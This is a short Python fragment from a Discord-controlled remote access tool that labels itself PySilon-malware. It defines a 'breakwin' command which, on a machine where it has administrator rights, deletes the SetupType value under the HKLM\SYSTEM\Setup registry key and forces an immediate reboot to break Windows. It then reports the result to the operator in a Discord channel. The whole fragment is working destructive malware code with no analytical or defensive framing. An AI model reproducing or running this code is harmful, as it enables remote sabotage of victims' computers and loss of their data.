import subprocess

@client.command(name='breakwin')
async def break_windows(ctx):
    await ctx.message.delete()
    try:
        if IsAdmin():
            subprocess.run(['reg', 'delete', 'HKLM\\SYSTEM\\Setup', '/v', 'SetupType', '/f'], check=True)
            subprocess.run(['shutdown', '/r', '/f', '/t', '0'], check=True)
            embed = discord.Embed(title="🟢 Success",description='Break windows has been successfully executed!',colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error",description='Script is not running as admin!',colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    except:
        embed = discord.Embed(title="📛 Error",description="An error occurred during windows break", colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)